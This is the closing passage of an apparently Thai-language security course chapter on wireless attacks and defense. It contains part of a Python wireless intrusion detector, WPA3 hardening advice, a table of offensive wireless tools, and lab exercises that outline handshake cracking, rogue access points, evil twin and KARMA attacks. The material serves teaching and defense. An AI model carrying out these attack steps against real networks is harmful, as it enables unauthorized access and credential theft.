        self.probe_flood[src] += 1
        
        if self.probe_flood[src] > 50:  # > 50 probes in short time
            alert = {
                'type': 'PROBE_FLOOD',
                'severity': 'MEDIUM',
                'src': src,
                'count': self.probe_flood[src],
                'timestamp': time.time()
            }
            self._raise_alert(alert)
            self.probe_flood[src] = 0
    
    def _raise_alert(self, alert: dict):
        """Handle alert"""
        severity = alert.get('severity', 'INFO')
        alert_type = alert.get('type', 'UNKNOWN')
        
        msg = f"[{severity}] {alert_type}: "
        if alert_type == 'DEAUTH_FLOOD':
            msg += f"From {alert['src']} targeting {alert['bssid']} ({alert['count']} frames)"
        elif alert_type == 'EVIL_TWIN':
            msg += f"SSID '{alert['ssid']}' (rogue: {alert['rogue_bssid']})"
        elif alert_type == 'PROBE_FLOOD':
            msg += f"From {alert['src']} ({alert['count']} probes)"
        
        if severity == 'CRITICAL':
            log.critical(msg)
        elif severity == 'HIGH':
            log.error(msg)
        elif severity == 'MEDIUM':
            log.warning(msg)
        else:
            log.info(msg)
        
        self.alerts.append(alert)
```

### 8.2 Wireless Security Best Practices

```
Wireless Security Recommendations:

1. WPA3 Configuration:
   - ใช้ WPA3-SAE แทน WPA2-PSK
   - Enable PMF (Protected Management Frames)
   - ปิด WPS

2. Enterprise WiFi:
   - ใช้ EAP-TLS (Certificate-based)
   - Server certificate validation
   - 802.1X port access control

3. Network Segmentation:
   - แยก Guest WiFi จาก Corporate
   - VLAN สำหรับ IoT devices
   - Zero-trust access

4. Monitoring:
   - Wireless IDS/IPS
   - ตรวจจับ rogue APs
   - เฝ้าระวัง deauth attacks

5. Password Policy:
   - WPA2: อย่างน้อย 20 ตัวอักษร
   - ใช้ passphrase แทน password
   - เปลี่ยนทุก 6 เดือน

6. Physical Security:
   - จำกัด RF coverage ให้อยู่ใน building
   - ใช้ directional antennas
   - ตรวจสอบ AP placement

7. Updates:
   - อัปเดต firmware สม่ำเสมอ
   - ใช้ vendor security advisories

8. WIDS Rules:
   [ ] Monitor deauth floods
   [ ] Detect duplicate SSIDs
   [ ] Track new MACs
   [ ] Alert on WEP networks
   [ ] Detect WPS enabled APs
   [ ] Monitor ad-hoc networks
```

---

## 9. สรุปและ Lab Exercises

### 9.1 Wireless Tools Reference

| Tool | Purpose |
|------|---------|
| **aircrack-ng** | WEP/WPA cracking suite |
| **hcxdumptool** | Capture PMKID/EAPOL |
| **hcxpcapngtool** | Convert to hashcat format |
| **hashcat** | GPU-accelerated password cracking |
| **wifiphisher** | Phishing attacks |
| **eaphammer** | WPA-Enterprise attacks |
| **hostapd-wpe** | Rogue AP for Enterprise |
| **reaver** | WPS brute force |
| **bettercap** | MitM framework |
| **RTL-SDR tools** | RF analysis |
| **GNU Radio** | SDR platform |
| **urh** | Universal Radio Hacker |

### 9.2 Lab Exercises

```
Level 1: WPA2 Cracking
- ตั้งค่า lab AP ด้วย WPA2-PSK (ใช้ง่าย)
- Capture 4-way handshake
- Crack ด้วย aircrack-ng + rockyou.txt
- ลอง PMKID attack

Level 2: Enterprise Attack
- ตั้งค่า FreeRADIUS + hostapd
- ติดตั้ง hostapd-wpe
- สร้าง rogue AP
- Capture MSCHAPv2 challenge/response
- Crack ด้วย asleap

Level 3: Advanced
- Evil Twin attack ด้วย wifiphisher
- BLE testing ด้วย Python/bleak
- RF analysis ด้วย RTL-SDR
- Wireless IDS development

Level 4: Expert
- KARMA attack automation
- WPA3 downgrade testing
- Custom deauth attack script
- Full wireless pentest report
```

### 9.3 สรุป

| หัวข้อ | ความครอบคลุม |
|--------|-------------|
| WPA2/WPA3 Attacks | PMKID, 4-way handshake, Dragonblood |
| Enterprise WiFi | EAP attacks, rogue RADIUS |
| Evil Twin/KARMA | Rogue AP, captive portal |
| Bluetooth | BLE testing, BlueBorne |
| RF Hacking | SDR, replay attacks, Flipper Zero |
| Wireless IDS | Deauth detection, evil twin detection |

---

← [Part 80: IoT Security](Part-80-IoT-Security.md) | [Part 82: Reverse Engineering](Part-82-Reverse-Engineering.md) →
